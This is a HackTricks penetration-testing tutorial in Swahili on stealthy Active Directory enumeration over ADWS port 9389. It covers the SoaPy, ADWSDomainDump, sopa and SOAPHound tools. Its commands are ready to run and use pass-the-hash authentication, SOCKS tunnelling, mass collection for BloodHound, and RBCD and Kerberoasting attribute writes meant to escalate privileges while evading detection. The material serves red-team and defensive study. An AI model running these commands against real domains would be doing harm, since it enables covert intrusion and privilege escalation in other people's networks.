# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS ni nini?

Active Directory Web Services (ADWS) **imewezeshwa kwa default kwenye kila Domain Controller tangu Windows Server 2008 R2** na husikiliza kwenye TCP **9389**. Licha ya jina lake, **hakuna HTTP inayohusika**. Badala yake, service hutoa data ya mtindo wa LDAP kupitia stack ya proprietary .NET framing protocols:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Kwa sababu traffic imefungwa ndani ya binary SOAP frames na hupita kwenye port isiyo ya kawaida, **enumeration kupitia ADWS ina uwezekano mdogo zaidi wa kukaguliwa, kuchujwa au kutambuliwa kwa signature kuliko traffic ya kawaida ya LDAP/389 na 636**. Kwa operators, hii inamaanisha:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon yenye stealth zaidi – Blue teams mara nyingi huzingatia LDAP queries.
* Uhuru wa kukusanya data kutoka kwa **hosts zisizo za Windows (Linux, macOS)** kwa kutunnel 9389/TCP kupitia SOCKS proxy.
* Data ileile ambayo ungepata kupitia LDAP (users, groups, ACLs, schema, n.k.) pamoja na uwezo wa kufanya **writes** (kwa mfano `msDs-AllowedToActOnBehalfOfOtherIdentity` kwa ajili ya **RBCD**).

Mawasiliano ya ADWS hutekelezwa kupitia WS-Enumeration: kila query huanza na message ya `Enumerate` inayofafanua LDAP filter/attributes na kurudisha GUID ya `EnumerationContext`, ikifuatiwa na message moja au zaidi za `Pull` zinazotuma matokeo hadi kufikia result window iliyowekwa na server.<sup>[[7]](#references)</sup> Contexts huisha baada ya takriban dakika 30, hivyo tooling inahitaji kupage results au kugawanya filters (prefix queries kwa kila CN) ili kuepuka kupoteza state.<sup>[[8]](#references)</sup> Unapoomba security descriptors, taja control ya `LDAP_SERVER_SD_FLAGS_OID` ili kuondoa SACLs; vinginevyo ADWS huondoa tu attribute ya `nTSecurityDescriptor` kutoka kwenye SOAP response yake.

> NOTE: ADWS pia hutumiwa na RSAT GUI/PowerShell tools nyingi, kwa hiyo traffic inaweza kuchanganyika na activity halali ya admin.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) ni **utekelezaji upya kamili wa ADWS protocol stack kwa pure Python**. Hutengeneza NBFX/NBFSE/NNS/NMF frames byte-for-byte, hivyo kuruhusu collection kutoka kwenye Unix-like systems bila kutumia .NET runtime.<sup>[[1]](#references)[[2]](#references)</sup>

### Key Features

* Inasaidia **proxying kupitia SOCKS** (inafaa kutoka kwa C2 implants).
* Search filters zenye udhibiti wa kina, zinazofanana na LDAP `-q '(objectClass=user)'`.
* Write operations za hiari ( `--set` / `--delete` ).
* **BOFHound output mode** kwa ingestion ya moja kwa moja kwenye BloodHound.
* Flag ya `--parse` kwa kuboresha uonyeshaji wa timestamps / `userAccountControl` wakati usomaji wa binadamu unahitajika.<sup>[[2]](#references)</sup>

### Targeted collection flags & write operations

SoaPy inakuja na switches zilizotayarishwa zinazoreplicate LDAP hunting tasks zinazotumika zaidi kupitia ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, pamoja na knobs za raw `--query` / `--filter` kwa custom pulls. Ziunganishe na write primitives kama `--rbcd <source>` (huweka `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging kwa targeted Kerberoasting) na `--asrep` (hubadilisha `DONT_REQ_PREAUTH` ndani ya `userAccountControl`).<sup>[[2]](#references)</sup>

Mfano wa targeted SPN hunt unaorudisha `samAccountName` na `servicePrincipalName` pekee:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Tumia host/credentials zilezile ili mara moja kugeuza findings kuwa hatua za mashambulizi: dump objects zenye uwezo wa RBCD kwa `--rbcds`, kisha tumia `--rbcd 'WEBSRV01$' --account 'FILE01$'` kuandaa mnyororo wa Resource-Based Constrained Delegation (tazama [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) kwa njia kamili ya abuse).

### Installation (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump kupitia ADWS (Linux/Windows)

* Fork ya `ldapdomaindump` inayobadilisha LDAP queries kuwa ADWS calls kwenye TCP/9389 ili kupunguza LDAP-signature hits.
* Hufanya ukaguzi wa awali wa reachability kwenye 9389 isipokuwa `--force` itumike (huruka probe ikiwa port scans zina kelele au zimechujwa).
* Imejaribiwa dhidi ya Microsoft Defender for Endpoint na CrowdStrike Falcon, ikiwa na bypass iliyofanikiwa kwenye README.<sup>[[4]](#references)</sup>

### Ufungaji
```bash
pipx install .
```
### Matumizi
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Kumbukumbu za matokeo ya kawaida hurekodi ukaguzi wa ufikikaji wa 9389, ADWS bind, na kuanza/kumaliza kwa dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Mteja wa vitendo wa ADWS katika Golang

Kama ilivyo kwa soapy, [sopa](https://github.com/Macmod/sopa) inatekeleza ADWS protocol stack (MS-NNS + MC-NMF + SOAP) katika Golang, na kutoa command-line flags za kutuma ADWS calls kama vile:<sup>[[5]](#references)</sup>

* **Utafutaji na urejeshaji wa objects** - `query` / `get`
* **Mzunguko wa maisha wa objects** - `create [user|computer|group|ou|container|custom]` na `delete`
* **Uhariri wa attributes** - `attr [add|replace|delete]`
* **Usimamizi wa accounts** - `set-password` / `change-password`
* na nyingine kama `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, n.k.

### Mambo muhimu ya protocol mapping

* Utafutaji wa mtindo wa LDAP hufanywa kupitia **WS-Enumeration** (`Enumerate` + `Pull`) ukiwa na attribute projection, scope control (Base/OneLevel/Subtree) na pagination.
* Urejeshaji wa object moja hutumia **WS-Transfer** `Get`; mabadiliko ya attributes hutumia `Put`; ufutaji hutumia `Delete`.
* Uundaji wa objects uliojengewa ndani hutumia **WS-Transfer ResourceFactory**; objects maalum hutumia **IMDA AddRequest** inayoendeshwa na YAML templates.
* Operesheni za password ni actions za **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Ugunduzi wa metadata bila authentication (mex)

ADWS hufichua WS-MetadataExchange bila credentials, ambayo ni njia ya haraka ya kuthibitisha exposure kabla ya kufanya authentication:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### Maelezo ya ugunduzi wa DNS/DC na ulengaji wa Kerberos

Sopa inaweza kutatua DCs kupitia SRV ikiwa `--dc` haijawekwa na `--domain` imetolewa. Huuliza kwa mpangilio huu na kutumia lengwa lenye kipaumbele cha juu:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Kiutendaji, pendelea resolver inayodhibitiwa na DC ili kuepuka hitilafu katika mazingira yaliyogawanywa:

* Tumia `--dns <DC-IP>` ili lookup zote za SRV/PTR/forward zipitie DC DNS.
* Tumia `--dns-tcp` wakati UDP imezuiwa au majibu ya SRV ni makubwa.
* Ikiwa Kerberos imewezeshwa na `--dc` ni IP, sopa hufanya **reverse PTR** ili kupata FQDN kwa ajili ya kulenga SPN/KDC kwa usahihi. Ikiwa Kerberos haitumiki, hakuna PTR lookup inayofanyika.

Mfano (IP + Kerberos, DNS imelazimishwa kupitia DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Chaguo za nyenzo za uthibitishaji

Mbali na manenosiri ya plaintext, sopa inasaidia **NT hashes**, **Kerberos AES keys**, **ccache**, na **PKINIT certificates** (PFX au PEM) kwa ADWS auth. Kerberos hutumika kiotomatiki unapotumia `--aes-key`, `-c` (ccache) au chaguo zinazotumia certificate.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Uundaji wa custom object kupitia templates

Kwa object classes za kiholela, command ya `create custom` hutumia YAML template inayolingana na IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` na `rdn` hufafanua container na relative DN.
* `attributes[].name` inakubali `cn` au `addata:cn` yenye namespace.
* `attributes[].type` inakubali `string|int|bool|base64|hex` au `xsd:*` iliyoainishwa wazi.
* **Usijumuishe** `ad:relativeDistinguishedName` au `ad:container-hierarchy-parent`; sopa huziongeza yenyewe.
* Thamani za `hex` hubadilishwa kuwa `xsd:base64Binary`; tumia `value: ""` kuweka strings tupu.

## SOAPHound – Ukusanyaji wa ADWS wa Kiasi Kikubwa (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ni .NET collector inayoweka LDAP interactions zote ndani ya ADWS na kutoa JSON inayooana na BloodHound v4. Huunda cache kamili ya `objectSid`, `objectGUID`, `distinguishedName` na `objectClass` mara moja (`--buildcache`), kisha huitumia tena kwa passes za kiwango kikubwa za `--bhdump`, `--certdump` (ADCS), au `--dnsdump` (AD-integrated DNS), hivyo ni takribani attributes 35 muhimu pekee zinazowahi kuondoka kwenye DC. AutoSplit (`--autosplit --threshold <N>`) hugawanya queries kiotomatiki kwa kutumia CN prefix ili kubaki chini ya muda wa timeout wa dakika 30 wa EnumerationContext katika forests kubwa.<sup>[[8]](#references)</sup>

Workflow ya kawaida kwenye operator VM iliyounganishwa kwenye domain:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Ilisafirisha JSON slots moja kwa moja kwenye workflows za SharpHound/BloodHound—angalia [BloodHound methodology](bloodhound.md) kwa mawazo ya downstream graphing. AutoSplit hufanya SOAPHound iwe resilient kwenye forests zenye mamilioni ya objects huku ikipunguza idadi ya queries ikilinganishwa na snapshots za mtindo wa ADExplorer.

## Stealth AD Collection Workflow

Workflow ifuatayo inaonyesha jinsi ya ku-enumerate **domain & ADCS objects** kupitia ADWS, kuzibadilisha kuwa BloodHound JSON na kutafuta attack paths zinazotegemea certificates – yote kutoka Linux:

1. **Tunnel 9389/TCP** kutoka target network hadi kwenye box yako (kwa mfano kupitia Chisel, Meterpreter, SSH dynamic port-forward, n.k.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` au tumia SoaPy’s `--proxyHost/--proxyPort`.

2. **Collect root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Kusanya objects zinazohusiana na ADCS kutoka kwenye Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Badilisha kuwa BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Pakia ZIP** katika GUI ya BloodHound na utekeleze cypher queries kama `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` ili kufichua njia za certificate escalation (ESC1, ESC8, n.k.).

### Kuandika `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Iunganishe hii na `s4u2proxy`/`Rubeus /getticket` ili kuunda mnyororo kamili wa **Resource-Based Constrained Delegation** (tazama [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Muhtasari wa Zana

| Kusudi | Zana | Maelezo |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, kusoma/kuandika |
| ADWS dump ya kiwango cha juu | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, modes za BH/ADCS/DNS |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Hubadilisha SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Inaweza kupitishwa kupitia SOCKS hiyo hiyo |
| ADWS enumeration & mabadiliko ya objects | [sopa](https://github.com/Macmod/sopa) | Generic client ya kuwasiliana na ADWS endpoints zinazojulikana - inaruhusu enumeration, uundaji wa objects, marekebisho ya attributes, na mabadiliko ya passwords |

## Marejeleo

- [1] [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
